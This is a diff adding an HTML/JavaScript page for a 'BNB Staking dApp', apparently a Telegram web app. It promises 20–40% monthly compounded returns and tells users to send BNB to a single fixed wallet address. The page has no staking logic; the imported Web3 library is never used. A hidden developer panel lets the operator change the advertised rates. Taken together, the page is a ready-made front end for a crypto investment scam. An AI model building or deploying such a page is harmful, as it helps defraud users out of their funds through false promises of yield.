@@ -1,0 +1,614 @@
+<html><head><base href="." /><title>BNB Staking dApp</title><meta charset="UTF-8" /><meta name="viewport" content="width=device-width, initial-scale=1.0" /><script src="https://cdn.jsdelivr.net/npm/web3@1.5.2/dist/web3.min.js"></script><script src="https://telegram.org/js/telegram-web-app.js"></script><script src="https://cdn.jsdelivr.net/npm/chart.js"></script><style>
+:root {
+    --theme-neumorphic-bg: #E4EBF5;
+    --theme-neumorphic-text: #4D4D4D;
+    --theme-neumorphic-primary: #6D5DFC;
+    --theme-neumorphic-shadow-light: #FFFFFF;
+    --theme-neumorphic-shadow-dark: #D1D9E6;
+
+    --theme-brutalist-bg: #ffffff;
+    --theme-brutalist-text: #000000;
+    --theme-brutalist-primary: #ff0000;
+    --theme-brutalist-border: 3px solid #000000;
+
+    --theme-glass-bg: rgba(255, 255, 255, 0.1);
+    --theme-glass-text: #ffffff;
+    --theme-glass-primary: rgba(109, 93, 252, 0.4);
+    --theme-glass-border: 1px solid rgba(255, 255, 255, 0.2);
+    --theme-glass-shadow: 0 8px 32px 0 rgba(31, 38, 135, 0.37);
+    --accent-color: #ff0000;
+}
+
+body {
+    transition: all 0.3s ease;
+}
+
+body[data-theme="neumorphic"] {
+    background-color: var(--theme-neumorphic-bg);
+    color: var(--theme-neumorphic-text);
+}
+
+body[data-theme="brutalist"] {
+    background-color: var(--theme-brutalist-bg);
+    color: var(--theme-brutalist-text);
+}
+
+body[data-theme="glass"] {
+    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+    color: var(--theme-glass-text);
+}
+
+h2 {
+    font-size: 24px;
+    font-weight: 600;
+    margin-bottom: 20px;
+    color: var(--theme-brutalist-text);
+    font-family: monospace;
+    text-transform: uppercase;
+}
+
+h3 {
+    font-size: 20px;
+    font-weight: 500;
+    margin-bottom: 15px;
+    color: var(--theme-brutalist-text);
+}
+
+label {
+    display: block;
+    font-size: 16px;
+    font-weight: 500;
+    margin-bottom: 12px;
+    color: var(--theme-brutalist-text);
+}
+
+.container {
+    max-width: 600px;
+    margin: 0 auto;
+    padding: 15px;
+    width: 100%;
+    box-sizing: border-box;
+}
+
+.page {
+    display: none;
+}
+
+.page.active {
+    display: block;
+    animation: fadeIn 0.3s ease-in-out;
+}
+
+@keyframes fadeIn {
+    from { opacity: 0; }
+    to { opacity: 1; }
+}
+
+.nav-tabs {
+    display: flex;
+    margin-bottom: 25px;
+    background: var(--theme-brutalist-bg);
+    border: var(--theme-brutalist-border);
+    box-shadow: 8px 8px 0 #000000;
+    border-radius: 15px;
+    padding: 5px;
+}
+
+.nav-tab {
+    flex: 1;
+    padding: 14px;
+    text-align: center;
+    cursor: pointer;
+    border-radius: 12px;
+    transition: all 0.3s;
+    font-weight: 500;
+    font-size: 16px;
+}
+
+.nav-tab.active {
+    background: var(--accent-color);
+    color: #ffffff;
+}
+
+.card {
+    width: 100%;
+    box-sizing: border-box;
+    background: var(--theme-brutalist-bg);
+    border: var(--theme-brutalist-border);
+    border-radius: 20px;
+    padding: 30px;
+    margin-bottom: 20px;
+    box-shadow: 8px 8px 0 #000000;
+    transition: all 0.2s ease;
+}
+
+.amount-buttons {
+    display: grid;
+    grid-template-columns: repeat(auto-fit, minmax(90px, 1fr));
+    gap: 12px;
+    margin: 20px 0;
+}
+
+.amount-btn {
+    width: 100%;
+    box-sizing: border-box;
+    min-width: 80px;
+    background: var(--theme-brutalist-bg);
+    border: var(--theme-brutalist-border);
+    padding: 16px;
+    border-radius: 12px;
+    color: var(--theme-brutalist-text);
+    cursor: pointer;
+    font-size: 15px;
+    font-weight: 500;
+    box-shadow: 4px 4px 0 #000000;
+    transition: all 0.3s;
+}
+
+.amount-btn:active, .amount-btn.active {
+    background: var(--accent-color);
+    color: #ffffff;
+}
+
+.result-card {
+    width: 100%;
+    box-sizing: border-box;
+    padding: 20px;
+    border-radius: 15px;
+    margin: 20px 0;
+    background: var(--theme-brutalist-bg);
+    border: var(--theme-brutalist-border);
+}
+
+.result-info-box {
+    width: 100%;
+    box-sizing: border-box;
+    font-size: clamp(14px, 2vw, 16px);
+    background: var(--theme-brutalist-bg);
+    border: var(--theme-brutalist-border);
+    padding: 12px;
+    margin: 10px 0;
+    border-radius: 8px;
+    box-shadow: 4px 4px 0 #000000;
+}
+
+.result-card h3 {
+    margin-bottom: 20px;
+}
+
+.result-card canvas {
+    margin-top: 20px;
+    height: 300px !important;
+    margin-bottom: 10px;
+}
+
+.deposit-address {
+    background: var(--theme-brutalist-bg);
+    padding: 20px;
+    border-radius: 12px;
+    font-family: monospace;
+    font-size: 16px;
+    word-break: break-all;
+    margin: 15px 0;
+    border: var(--theme-brutalist-border);
+}
+
+.copy-btn {
+    background: var(--accent-color);
+    border: var(--theme-brutalist-border);
+    padding: 14px 24px;
+    border-radius: 10px;
+    color: #ffffff;
+    cursor: pointer;
+    font-size: 15px;
+    font-weight: 500;
+    box-shadow: 4px 4px 0 #000000;
+    transition: all 0.3s;
+    margin-top: 10px;
+    width: 100%;
+}
+
+.copy-btn:active {
+    transform: translate(4px, 4px);
+    box-shadow: none;
+}
+
+.apy-rates {
+    margin-top: 25px;
+    padding: 15px;
+    border-radius: 12px;
+    background: var(--theme-brutalist-bg);
+    border: var(--theme-brutalist-border);
+}
+
+.apy-rates p {
+    margin: 8px 0;
+    font-size: 15px;
+    line-height: 1.6;
+}
+
+.return-type-switch {
+    display: none;
+}
+
+.dev-panel {
+    position: fixed;
+    bottom: 20px;
+    right: 20px;
+    padding: 15px;
+    border-radius: 15px;
+    z-index: 1000;
+    max-width: 300px;
+    width: calc(100% - 40px);
+    max-height: 80vh;
+    overflow-y: auto;
+    display: none; /* Hide by default */
+    right: 70px; /* Move panel to make room for button */
+}
+
+[data-theme="neumorphic"] .dev-panel {
+    background: var(--theme-neumorphic-bg);
+    box-shadow: 8px 8px 16px var(--theme-neumorphic-shadow-dark), -8px -8px 16px var(--theme-neumorphic-shadow-light);
+}
+
+[data-theme="brutalist"] .dev-panel {
+    background: var(--theme-brutalist-bg);
+    border: var(--theme-brutalist-border);
+}
+
+[data-theme="glass"] .dev-panel {
+    background: var(--theme-glass-bg);
+    backdrop-filter: blur(16px);
+    border: var(--theme-glass-border);
+    box-shadow: var(--theme-glass-shadow);
+}
+
+.theme-btn {
+    padding: 8px 16px;
+    margin: 5px;
+    cursor: pointer;
+    border-radius: 8px;
+    font-weight: 500;
+}
+
+.settings-group {
+    margin: 10px 0;
+}
+
+.settings-group label {
+    font-size: 14px;
+    margin-bottom: 5px;
+}
+
+.settings-group input {
+    width: 100%;
+    padding: 8px;
+    border: var(--theme-brutalist-border);
+    border-radius: 8px;
+    margin-top: 5px;
+}
+
+.currency-toggle {
+    display: flex;
+    gap: 10px;
+    margin-bottom: 15px;
+    flex-wrap: wrap;
+}
+
+.toggle-btn {
+    flex: 1;
+    min-width: 80px;
+    background: var(--theme-brutalist-bg);
+    border: var(--theme-brutalist-border);
+    padding: 8px 16px;
+    border-radius: 8px;
+    cursor: pointer;
+    font-weight: 500;
+    box-shadow: 4px 4px 0 #000000;
+    transition: all 0.3s;
+}
+
+.toggle-btn.active {
+    background: var(--accent-color);
+    color: #ffffff;
+}
+
+[data-theme="neumorphic"] .return-type-btn,
+[data-theme="neumorphic"] .theme-btn {
+    background: var(--theme-neumorphic-bg);
+    box-shadow: 6px 6px 12px var(--theme-neumorphic-shadow-dark), -6px -6px 12px var(--theme-neumorphic-shadow-light);
+}
+
+[data-theme="brutalist"] .return-type-btn,
+[data-theme="brutalist"] .theme-btn {
+    background: var(--theme-brutalist-bg);
+    border: var(--theme-brutalist-border);
+}
+
+[data-theme="glass"] .return-type-btn,
+[data-theme="glass"] .theme-btn {
+    background: var(--theme-glass-bg);
+    backdrop-filter: blur(16px);
+    border: var(--theme-glass-border);
+}
+
+.active-return-type {
+    background: var(--accent-color) !important;
+    color: white;
+}
+
+.dev-toggle-btn {
+    position: fixed;
+    bottom: 20px;
+    right: 20px;
+    padding: 10px 20px;
+    background: var(--accent-color);
+    border: var(--theme-brutalist-border);
+    border-radius: 10px;
+    color: #ffffff;
+    cursor: pointer;
+    font-size: 14px;
+    font-weight: 500;
+    box-shadow: 4px 4px 0 #000000;
+    transition: all 0.3s;
+    z-index: 999;
+}
+
+.dev-toggle-btn:active {
+    transform: translate(4px, 4px);
+    box-shadow: none;
+}
+</style></head><body data-theme="brutalist"><div class="container"><button id="dev-toggle" class="dev-toggle-btn">Dev Tools</button><div class="nav-tabs"><div class="nav-tab active" onclick="showPage('calculator')">Calculator</div><div class="nav-tab" onclick="showPage('deposit')">Deposit</div></div><div id="calculator-page" class="page active"><div class="card"><h2>BNB Staking Calculator</h2><div class="calculator"><div class="amount-selection"><label>Select Initial Investment (BNB)</label><div class="amount-buttons"><button class="amount-btn" data-bnb="0.01" onclick="selectAmount(this)">0.01 BNB</button><button class="amount-btn" data-bnb="0.1" onclick="selectAmount(this)">0.1 BNB</button><button class="amount-btn" data-bnb="0.5" onclick="selectAmount(this)">0.5 BNB</button><button class="amount-btn" data-bnb="1" onclick="selectAmount(this)">1 BNB</button><button class="amount-btn" data-bnb="5" onclick="selectAmount(this)">5 BNB</button><button class="amount-btn" data-bnb="10" onclick="selectAmount(this)">10 BNB</button></div></div><div class="currency-toggle"><button class="toggle-btn active" onclick="setCurrency('BNB')">BNB</button><button class="toggle-btn" onclick="setCurrency('USD')">USD</button></div><div class="result-card"><h3>Expected Returns</h3><div class="result-info-box" id="initial-amount">Initial Amount: 0.01 BNB</div><div class="result-info-box" id="monthly-rate">Monthly Rate: 2.50%</div><div class="result-info-box" id="monthly-return">Monthly Return: 0.01 BNB</div><div class="result-info-box" id="yearly-return">Total Yearly Return: 0.12 BNB</div><canvas id="returnsChart" width="400" height="200"></canvas></div></div></div></div><div id="deposit-page" class="page"><div class="card"><h2>Deposit BNB</h2><div class="result-info-box"><p>Send your BNB to the following address:</p></div><div class="deposit-address" id="deposit-address">0x742d35Cc6634C0532925a3b844Bc454e4438f44e</div><button class="copy-btn" onclick="copyAddress()">Copy Address</button><div class="apy-rates"><div class="result-info-box"><p>Minimum stake: 0.01 BNB</p></div><div class="result-info-box"><p>Monthly rates:</p><p>0.01 - 1 BNB: 20% Monthly</p><p>1 - 5 BNB: 30% Monthly</p><p>5+ BNB: 40% Monthly</p></div></div></div></div></div><div class="dev-panel"><h4>Monthly Return Rate Settings</h4><div class="settings-group"><label>Tier 1 Monthly Rate (0.01-1 BNB):</label><input type="number" id="tier1-apy" value="20" onchange="updateAPYRates()"></div><div class="settings-group"><label>Tier 2 Monthly Rate (1-5 BNB):</label><input type="number" id="tier2-apy" value="30" onchange="updateAPYRates()"></div><div class="settings-group"><label>Tier 3 Monthly Rate (5+ BNB):</label><input type="number" id="tier3-apy" value="40" onchange="updateAPYRates()"></div><div class="settings-group"><label>Accent Color:</label><input type="color" id="accent-color" value="#ff0000" onchange="updateAccentColor()"></div><div class="settings-group"><label>BNB Price (USD):</label><input type="number" id="bnb-price" value="500" onchange="updateBNBPrice()"></div></div><script>
+document.addEventListener('DOMContentLoaded', function() {
+    let tg = window.Telegram?.WebApp;
+    if (tg) {
+        tg.expand();
+    }
+    initChart();
+    calculateReturns(0.01);
+});
+
+let returnsChart;
+let currentCurrency = 'BNB';
+let bnbPrice = 500;
+
+function initChart() {
+    const ctx = document.getElementById('returnsChart').getContext('2d');
+    returnsChart = new Chart(ctx, {
+        type: 'line',
+        data: {
+            labels: Array.from({length: 13}, (_, i) => `Month ${i}`),
+            datasets: [{
+                label: 'BNB Balance',
+                data: [],
+                borderColor: getComputedStyle(document.documentElement).getPropertyValue('--accent-color'),
+                backgroundColor: `${getComputedStyle(document.documentElement).getPropertyValue('--accent-color')}33`,
+                fill: true,
+                tension: 0.4,
+                pointRadius: 6,
+                pointHoverRadius: 8,
+                pointBackgroundColor: getComputedStyle(document.documentElement).getPropertyValue('--accent-color'),
+                pointBorderColor: '#fff',
+                pointBorderWidth: 2
+            }]
+        },
+        options: {
+            responsive: true,
+            maintainAspectRatio: false,
+            interaction: {
+                intersect: false,
+                mode: 'index'
+            },
+            plugins: {
+                legend: {
+                    position: 'top',
+                    labels: {
+                        font: {
+                            size: Math.min(14, window.innerWidth / 40),
+                            family: 'monospace'
+                        },
+                        padding: Math.min(20, window.innerWidth / 30)
+                    }
+                },
+                title: {
+                    display: true,
+                    text: 'Balance Growth Over Time',
+                    font: {
+                        size: Math.min(16, window.innerWidth / 35),
+                        family: 'monospace',
+                        weight: 'bold'
+                    },
+                    padding: Math.min(20, window.innerWidth / 30)
+                }
+            },
+            scales: {
+                x: {
+                    grid: {
+                        color: 'rgba(0, 0, 0, 0.1)',
+                    },
+                    ticks: {
+                        font: {
+                            family: 'monospace',
+                            size: Math.min(12, window.innerWidth / 45)
+                        }
+                    }
+                },
+                y: {
+                    grid: {
+                        color: 'rgba(0, 0, 0, 0.1)',
+                    },
+                    ticks: {
+                        font: {
+                            family: 'monospace',
+                            size: Math.min(12, window.innerWidth / 45)
+                        },
+                        callback: function(value) {
+                            if (currentCurrency === 'USD') {
+                                return '$' + value.toFixed(2);
+                            } else {
+                                return value.toFixed(4) + ' BNB';
+                            }
+                        }
+                    }
+                }
+            }
+        }
+    });
+}
+
+function getCurrentAmount() {
+    const activeBtn = document.querySelector('.amount-btn.active');
+    if (!activeBtn) return 0.01;
+    
+    return parseFloat(activeBtn.getAttribute('data-bnb'));
+}
+
+function selectAmount(btn) {
+    document.querySelectorAll('.amount-btn').forEach(b => {
+        b.classList.remove('active');
+    });
+    btn.classList.add('active');
+    calculateReturns(getCurrentAmount());
+}
+
+function calculateReturns(amount) {
+    const initialAmount = document.getElementById('initial-amount');
+    const monthlyRate = document.getElementById('monthly-rate');
+    const monthlyReturn = document.getElementById('monthly-return');
+    const yearlyReturn = document.getElementById('yearly-return');
+
+    const tier1 = parseFloat(document.getElementById('tier1-apy').value);
+    const tier2 = parseFloat(document.getElementById('tier2-apy').value);
+    const tier3 = parseFloat(document.getElementById('tier3-apy').value);
+    
+    let monthlyRateValue;
+    if (amount < 1) {
+        monthlyRateValue = tier1;
+    } else if (amount < 5) {
+        monthlyRateValue = tier2;
+    } else {
+        monthlyRateValue = tier3;
+    }
+    
+    // Calculate compound returns
+    const monthlyReturnAmount = amount * (monthlyRateValue / 100);
+    const yearlyReturnAmount = amount * (Math.pow(1 + monthlyRateValue/100, 12) - 1);
+
+    if (currentCurrency === 'BNB') {
+        initialAmount.textContent = `Initial Amount: ${amount.toFixed(4)} BNB`;
+        monthlyRate.textContent = `Monthly Rate: ${(monthlyRateValue).toFixed(2)}%`;
+        monthlyReturn.textContent = `Monthly Return: ${monthlyReturnAmount.toFixed(4)} BNB`;
+        yearlyReturn.textContent = `Total Yearly Return: ${yearlyReturnAmount.toFixed(4)} BNB`;
+    } else {
+        initialAmount.textContent = `Initial Amount: $${(amount * bnbPrice).toFixed(2)}`;
+        monthlyRate.textContent = `Monthly Rate: ${(monthlyRateValue).toFixed(2)}%`;
+        monthlyReturn.textContent = `Monthly Return: $${(monthlyReturnAmount * bnbPrice).toFixed(2)}`;
+        yearlyReturn.textContent = `Total Yearly Return: $${(yearlyReturnAmount * bnbPrice).toFixed(2)}`;
+    }
+    
+    updateChart(amount, monthlyRateValue);
+}
+
+function updateChart(amount, monthlyRate) {
+    let balance = amount;
+    const data = [balance];
+    
+    // Changed to compound interest calculation
+    for(let i = 1; i <= 12; i++) {
+        // Each month's return is based on the previous month's total balance
+        balance = balance * (1 + monthlyRate/100);
+        data.push(balance);
+    }
+    
+    const finalData = currentCurrency === 'USD' ? data.map(val => val * bnbPrice) : data;
+    
+    returnsChart.data.datasets[0].label = `Balance (${currentCurrency})`;
+    returnsChart.data.datasets[0].data = finalData;
+    returnsChart.update();
+}
+
+function updateAPYRates() {
+    calculateReturns(getCurrentAmount());
+}
+
+function setCurrency(currency) {
+    currentCurrency = currency;
+    document.querySelectorAll('.toggle-btn').forEach(btn => {
+        btn.classList.remove('active');
+    });
+    document.querySelector(`.toggle-btn[onclick="setCurrency('${currency}')"]`).classList.add('active');
+
+    document.querySelectorAll('.amount-btn').forEach(btn => {
+        const bnbAmount = parseFloat(btn.getAttribute('data-bnb'));
+        if (currency === 'USD') {
+            btn.textContent = `$${(bnbAmount * bnbPrice).toFixed(2)}`;
+        } else {
+            btn.textContent = `${bnbAmount} BNB`;
+        }
+    });
+    
+    calculateReturns(getCurrentAmount());
+}
+
+function showPage(pageId) {
+    document.querySelectorAll('.page').forEach(page => {
+        page.classList.remove('active');
+    });
+    document.querySelectorAll('.nav-tab').forEach(tab => {
+        tab.classList.remove('active');
+    });
+    document.getElementById(pageId + '-page').classList.add('active');
+    document.querySelector(`.nav-tab[onclick="showPage('${pageId}')"]`).classList.add('active');
+}
+
+function copyAddress() {
+    const address = document.getElementById('deposit-address').innerText;
+    const tg = window.Telegram?.WebApp;
+    navigator.clipboard.writeText(address.trim()).then(() => {
+        if (tg) {
+            tg.showPopup({
+                title: 'Success',
+                message: 'Address copied to clipboard',
+                buttons: [{type: 'ok'}]
+            });
+        } else {
+            alert('Address copied to clipboard');
+        }
+    }).catch(err => {
+        if (tg) {
+            tg.showAlert('Failed to copy address');
+        } else {
+            alert('Failed to copy address');
+        }
+    });
+}
+
+function updateBNBPrice() {
+    bnbPrice = parseFloat(document.getElementById('bnb-price').value);
+    calculateReturns(getCurrentAmount());
+}
+
+function updateAccentColor() {
+    const color = document.getElementById('accent-color').value;
+    document.documentElement.style.setProperty('--accent-color', color);
+    returnsChart.data.datasets[0].borderColor = color;
+    returnsChart.update();
+}
+
+window.addEventListener('resize', function() {
+    if (returnsChart) {
+        returnsChart.options.plugins.legend.labels.font.size = Math.min(14, window.innerWidth / 40);
+        returnsChart.options.plugins.title.font.size = Math.min(16, window.innerWidth / 35);
+        returnsChart.options.scales.x.ticks.font.size = Math.min(12, window.innerWidth / 45);
+        returnsChart.options.scales.y.ticks.font.size = Math.min(12, window.innerWidth / 45);
+        returnsChart.update();
+    }
+});
+
+const devToggleBtn = document.getElementById('dev-toggle');
+const devPanel = document.querySelector('.dev-panel');
+
+devToggleBtn.addEventListener('click', function() {
+    devPanel.classList.toggle('visible');
+});
+</script></body></html>
